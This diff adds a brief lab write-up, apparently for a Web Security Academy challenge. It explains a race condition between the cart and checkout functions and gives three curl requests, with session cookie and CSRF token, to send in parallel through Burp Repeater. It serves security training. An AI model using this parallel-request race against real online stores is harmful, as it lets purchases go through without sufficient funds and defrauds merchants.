@@ -1,0 +1,22 @@
+
+
+for solve this chalange after analyze website you can find race condition when purchase and checkout function is call
+
+so create group requet in Repeater in Burp and send this req with this order and parallel :
+
+curl -i -s -k -X $'GET' \
+    -H $'Host: 0a8800b403dce1068032bc720072006a.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://0a8800b403dce1068032bc720072006a.web-security-academy.net/cart?err=INSUFFICIENT_FUNDS' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=q7v0kdJAkUrT6ITOt0dK2ytoKgbrahIt' \
+    $'https://0a8800b403dce1068032bc720072006a.web-security-academy.net/'
+	
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a8800b403dce1068032bc720072006a.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 37' -H $'Origin: https://0a8800b403dce1068032bc720072006a.web-security-academy.net' -H $'Referer: https://0a8800b403dce1068032bc720072006a.web-security-academy.net/cart' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=q7v0kdJAkUrT6ITOt0dK2ytoKgbrahIt' \
+    --data-binary $'csrf=NMuqa9c5eKVFlmyq6hckOXzIMuxPkyF2' \
+    $'https://0a8800b403dce1068032bc720072006a.web-security-academy.net/cart/checkout'
+	
+curl -i -s -k -X $'POST' \
+    -H $'Host: 0a8800b403dce1068032bc720072006a.web-security-academy.net' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 36' -H $'Origin: https://0a8800b403dce1068032bc720072006a.web-security-academy.net' -H $'Referer: https://0a8800b403dce1068032bc720072006a.web-security-academy.net/product?productId=1' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' -H $'Sec-Gpc: 1' -H $'Te: trailers' \
+    -b $'session=q7v0kdJAkUrT6ITOt0dK2ytoKgbrahIt' \
+    --data-binary $'productId=1&redir=PRODUCT&quantity=1' \
+    $'https://0a8800b403dce1068032bc720072006a.web-security-academy.net/cart'
